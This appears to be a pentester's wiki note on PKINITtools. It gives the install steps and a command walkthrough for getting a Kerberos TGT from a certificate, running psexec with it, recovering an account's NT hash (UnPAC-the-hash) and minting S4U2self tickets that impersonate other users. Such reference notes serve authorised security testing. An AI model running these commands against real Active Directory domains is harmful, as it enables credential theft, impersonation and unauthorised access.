# PKINITtools

**Tags:** `#pkinittools` `#pkinit` `#adcs` `#kerberos` `#activedirectory` `#python`

Python scripts (dirkjanm) for Kerberos PKINIT — authenticating with a certificate to get a TGT, recovering a user's NT hash from the PKINIT reply, and doing S4U delegation from a cert-obtained TGT. The Linux/manual counterpart to [[Tools/AD/Certipy|Certipy]]'s built-in `auth` command; useful when you need the individual steps rather than Certipy's all-in-one flow.

**Source:** https://github.com/dirkjanm/PKINITtools
**Install:**
```bash
git clone https://github.com/dirkjanm/PKINITtools
cd PKINITtools && pip install -r requirements.txt
```

**Three scripts (the whole repo):**

| Script | Does |
|---|---|
| `gettgtpkinit.py` | Certificate (PFX/PEM) → **TGT**. Prints the **AS-REP encryption key** — keep it, `getnthash` needs it. |
| `getnthash.py` | Uses that AS-REP key + the TGT to recover the account's **NT hash** (UnPAC-the-hash). |
| `gets4uticket.py` | From a cert-obtained TGT, request an **S4U2self service ticket impersonating any user** — the delegation/RBCD payoff without Rubeus. |

```bash
# 1) Cert → TGT.  -cert-pfx (PFX) or -cert-pem + -key-pem; -pfx-pass for an encrypted PFX.
python3 gettgtpkinit.py -cert-pfx Administrator.pfx <domain>/Administrator Administrator.ccache
#    → note the "AS-REP encryption key" it prints (hex)

# 2) Use the TGT directly
export KRB5CCNAME=Administrator.ccache
impacket-psexec <domain>/Administrator@<target> -k -no-pass

# 3) UnPAC-the-hash — recover the NT hash from that AS-REP key (needs the ccache in KRB5CCNAME)
python3 getnthash.py -key <AS_REP_encryption_key> <domain>/Administrator
#    -doKeyList also dumps supported-encryption-type keys (AES) alongside the RC4/NT hash

# 4) S4U2self from the cert TGT — mint a service ticket impersonating a user
#    (e.g. you cert-authed as a machine account and want cifs/ as the admin)
python3 gets4uticket.py \
  kerberos+ccache://<domain>\\Administrator:Administrator.ccache@<dc-ip> \
  cifs/fileserver.corp.local@CORP.LOCAL <victim_to_impersonate> out.ccache
#    IMPORTANT: SPN must use the server HOSTNAME, not an IP.
```

> [!note] **See also** — [[Services/Active Directory/ADCS|ADCS]] Connect / Access section for the full cert-to-shell workflow.

---

*Created: 2026-07-27*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
